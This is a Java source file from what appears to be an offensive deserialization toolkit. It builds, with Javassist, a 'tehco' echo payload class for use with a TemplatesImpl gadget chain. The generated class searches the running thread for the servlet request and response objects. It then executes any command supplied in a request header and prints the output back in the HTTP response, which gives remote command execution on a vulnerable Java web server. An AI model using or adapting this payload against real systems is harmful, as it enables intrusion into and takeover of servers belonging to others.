package com.summersec.attack.deser.echo;
//Author:fnmsd
//Blog:https://blog.csdn.net/fnmsd

import com.summersec.attack.deser.util.Gadgets;
import javassist.*;


public class AllEcho implements EchoPayload {


    @Override
    public CtClass genPayload(ClassPool pool) throws Exception {
        CtClass clazz = pool.makeClass("com.summersec.x.Test" + System.nanoTime());
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        //HTTPServletRequest.class
        //HTTPServletResponse.class

        clazz.addField(CtField.make("static Class hsr;",clazz));
        clazz.addField(CtField.make("static Class hsp;",clazz));
        clazz.addField(CtField.make("static String cmd;",clazz));
        clazz.addField(CtField.make("static Object r;",clazz));
        clazz.addField(CtField.make("static Object p;",clazz));
        clazz.addField(CtField.make("static java.util.HashSet/*<Object>*/ h;",clazz));
        clazz.addField(CtField.make("static ClassLoader cl = Thread.currentThread().getContextClassLoader();",clazz));

        //  http://127.0.0.1:8001/index
        // helloMe
        //  kPH+bIxk5D2deZiIxcaaaA==
//        clazz.addMethod(CtNewMethod.make("private static void F(Object start, int depth){\n\n      Class n=start.getClass();\n   do{\n     for (java.lang.reflect.Field declaredField : n.getDeclaredFields()) {\n     declaredField.setAccessible(true);\n        Object o = null;\n      try{\n      o = declaredField.get(start);\n\n         if(!o.getClass().isArray()){\n    p(o,depth);\n      }else{\n     for (Object q : (Object[]) o) {\n      p(q, depth);\n      }\n     \n     }\n      \n     }catch (Exception e){\n     }\n     }\n     \n  }while(\n       (n = n.getSuperclass())!=null\n     );\n       }",clazz));
        clazz.addMethod(CtMethod.make("private static boolean i(Object obj){\nif(obj==null|| h.contains(obj)){\nreturn true;\n}\nh.add(obj);\nreturn false;\n}",clazz));

        clazz.addMethod(CtMethod.make("private static void p(Object o, int depth){\nif(depth > 52||(r !=null&& p !=null)){\nreturn;\n}\nif(!i(o)){\nif(r ==null&&hsr.isAssignableFrom(o.getClass())){\nr = o;\ntry {\ncmd = (String)hsr.getMethod(\"getHeader\",new Class[]{String.class}).invoke(o,\"tehco\");\nif(cmd==null) {\nr = null;\n}else{\ntry {\njava.lang.reflect.Method getResponse = r.getClass().getMethod(\"getResponse\");\np = getResponse.invoke(r);\n} catch (Exception e) {\nr=null;\n}\n}\n} catch (IllegalAccessException e) {\ne.printStackTrace();\n} catch (java.lang.reflect.InvocationTargetException e) {\ne.printStackTrace();\n} catch (NoSuchMethodException e) {\ne.printStackTrace();\n}\n}else if(p ==null&&hsp.isAssignableFrom(o.getClass())){\np =  o;\n}\nif(r !=null&& p !=null){\ntry {\nString charsetName = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? \"GBK\":\"UTF-8\";\njava.io.PrintWriter pw =  (java.io.PrintWriter)hsp.getMethod(\"getWriter\").invoke(p);\npw.println(new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream(),charsetName).useDelimiter(\"\\\\A\").next());\npw.flush();\npw.close();\n//p.addHeader(\"out\",new Scanner(Runtime.getRuntime().exec(r.getHeader(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next());\n}catch (Exception e){\n}\nreturn;\n}\n\nF(o,depth+1);\n}\n}",clazz));

        clazz.addConstructor(CtNewConstructor.make("    public AllEcho() {\n r = null;\np = null;\nh = new java.util.HashSet/*<Object>*/();\ntry {\nhsr = cl.loadClass(\"javax.servlet.http.HttpServletRequest\");\nhsp = cl.loadClass(\"javax.servlet.http.HttpServletResponse\");\n} catch (ClassNotFoundException e) {\ne.printStackTrace();\n}\n F(java.lang.Thread.currentThread(),0);\n}",clazz));


        return clazz;
    }

    public static void main(String[] args) throws Exception {
//        String echoOpt;
        Object template = Gadgets.createTemplatesImpl("AllEcho");
    }
}